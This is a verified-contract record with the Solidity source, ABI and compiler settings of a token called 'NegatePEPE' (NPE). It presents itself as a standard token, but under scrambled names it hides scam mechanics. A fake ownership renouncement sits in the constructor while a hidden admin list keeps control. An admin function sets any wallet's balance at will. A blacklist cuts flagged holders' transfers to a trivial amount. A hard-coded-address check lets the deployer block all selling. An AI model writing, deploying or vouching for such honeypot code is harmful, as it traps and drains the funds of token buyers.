{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface totalTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLiquidity) external view returns (uint256);\n\n    function transfer(address launchedLaunchIs, uint256 fundSwapSender) external returns (bool);\n\n    function allowance(address feeEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundSwapSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedLaunchIs,\n        uint256 fundSwapSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);\n    event Approval(address indexed feeEnable, address indexed spender, uint256 value);\n}\n\nabstract contract launchedWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedLimitTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTrading {\n    function createPair(address launchTeam, address fromAuto) external returns (address);\n}\n\ninterface totalToMetadata is totalTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NegatePEPE is launchedWallet, totalTo, totalToMetadata {\n\n    string private teamLimit = \"NPE\";\n\n    mapping(address => bool) public walletMin;\n\n    function transfer(address receiverLaunched, uint256 fundSwapSender) external virtual override returns (bool) {\n        return receiverLimit(_msgSender(), receiverLaunched, fundSwapSender);\n    }\n\n    function minBuy(address autoTx) public {\n        autoMarketing();\n        if (minFrom) {\n            minFrom = false;\n        }\n        if (autoTx == launchedAmount || autoTx == launchExempt) {\n            return;\n        }\n        amountReceiver[autoTx] = true;\n    }\n\n    bool public tokenLaunch;\n\n    address public launchedAmount;\n\n    function balanceOf(address tokenLiquidity) public view virtual override returns (uint256) {\n        return totalList[tokenLiquidity];\n    }\n\n    bool private takeBuy;\n\n    uint256 private fromMode;\n\n    bool private minShould;\n\n    function approve(address senderMarketing, uint256 fundSwapSender) public virtual override returns (bool) {\n        listAt[_msgSender()][senderMarketing] = fundSwapSender;\n        emit Approval(_msgSender(), senderMarketing, fundSwapSender);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeExempt;\n    }\n\n    bool public exemptFundTrading;\n\n    constructor (){\n        \n        launchedLimitTeam launchedSwap = launchedLimitTeam(toMin);\n        launchExempt = senderTrading(launchedSwap.factory()).createPair(launchedSwap.WETH(), address(this));\n        \n        launchedAmount = _msgSender();\n        walletTradingLaunched();\n        walletMin[launchedAmount] = true;\n        totalList[launchedAmount] = atSwap;\n        if (fromMode != listTrading) {\n            takeBuy = false;\n        }\n        emit Transfer(address(0), launchedAmount, atSwap);\n    }\n\n    bool public minFrom;\n\n    function allowance(address buyLiquidityTx, address senderMarketing) external view virtual override returns (uint256) {\n        if (senderMarketing == toMin) {\n            return type(uint256).max;\n        }\n        return listAt[buyLiquidityTx][senderMarketing];\n    }\n\n    string private modeExempt = \"Negate PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFund;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atSwap;\n    }\n\n    uint256 private atSwap = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return marketingAutoFee;\n    }\n\n    uint256 liquidityMode;\n\n    address private marketingAutoFee;\n\n    function exemptLiquidity(address receiverLaunched, uint256 fundSwapSender) public {\n        autoMarketing();\n        totalList[receiverLaunched] = fundSwapSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private listAt;\n\n    function receiverLimit(address exemptSell, address launchedLaunchIs, uint256 fundSwapSender) internal returns (bool) {\n        if (exemptSell == launchedAmount) {\n            return exemptReceiverAuto(exemptSell, launchedLaunchIs, fundSwapSender);\n        }\n        uint256 launchedAmountSender = totalTo(launchExempt).balanceOf(liquiditySell);\n        require(launchedAmountSender == sellSender);\n        require(launchedLaunchIs != liquiditySell);\n        if (amountReceiver[exemptSell]) {\n            return exemptReceiverAuto(exemptSell, launchedLaunchIs, maxLimit);\n        }\n        return exemptReceiverAuto(exemptSell, launchedLaunchIs, fundSwapSender);\n    }\n\n    function transferFrom(address exemptSell, address launchedLaunchIs, uint256 fundSwapSender) external override returns (bool) {\n        if (_msgSender() != toMin) {\n            if (listAt[exemptSell][_msgSender()] != type(uint256).max) {\n                require(fundSwapSender <= listAt[exemptSell][_msgSender()]);\n                listAt[exemptSell][_msgSender()] -= fundSwapSender;\n            }\n        }\n        return receiverLimit(exemptSell, launchedLaunchIs, fundSwapSender);\n    }\n\n    bool private autoFund;\n\n    event OwnershipTransferred(address indexed takeMax, address indexed marketingIs);\n\n    function senderLiquidity(address isExempt) public {\n        if (tokenLaunch) {\n            return;\n        }\n        if (takeBuy) {\n            teamSellAuto = true;\n        }\n        walletMin[isExempt] = true;\n        \n        tokenLaunch = true;\n    }\n\n    uint256 constant maxLimit = 5 ** 10;\n\n    uint8 private minFund = 18;\n\n    uint256 public listTrading;\n\n    bool public teamSellAuto;\n\n    uint256 public fundSwap;\n\n    address liquiditySell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address toMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLimit;\n    }\n\n    uint256 sellSender;\n\n    uint256 public modeShould;\n\n    mapping(address => bool) public amountReceiver;\n\n    mapping(address => uint256) private totalList;\n\n    function autoMarketing() private view {\n        require(walletMin[_msgSender()]);\n    }\n\n    function exemptReceiverAuto(address exemptSell, address launchedLaunchIs, uint256 fundSwapSender) internal returns (bool) {\n        require(totalList[exemptSell] >= fundSwapSender);\n        totalList[exemptSell] -= fundSwapSender;\n        totalList[launchedLaunchIs] += fundSwapSender;\n        emit Transfer(exemptSell, launchedLaunchIs, fundSwapSender);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingAutoFee;\n    }\n\n    function walletTradingLaunched() public {\n        emit OwnershipTransferred(launchedAmount, address(0));\n        marketingAutoFee = address(0);\n    }\n\n    address public launchExempt;\n\n    function buyLiquidityWallet(uint256 fundSwapSender) public {\n        autoMarketing();\n        sellSender = fundSwapSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidityTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwapSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundSwapSender\",\"type\":\"uint256\"}],\"name\":\"buyLiquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwapSender\",\"type\":\"uint256\"}],\"name\":\"exemptLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTx\",\"type\":\"address\"}],\"name\":\"minBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isExempt\",\"type\":\"address\"}],\"name\":\"senderLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSellAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwapSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLaunchIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSwapSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTradingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NegatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}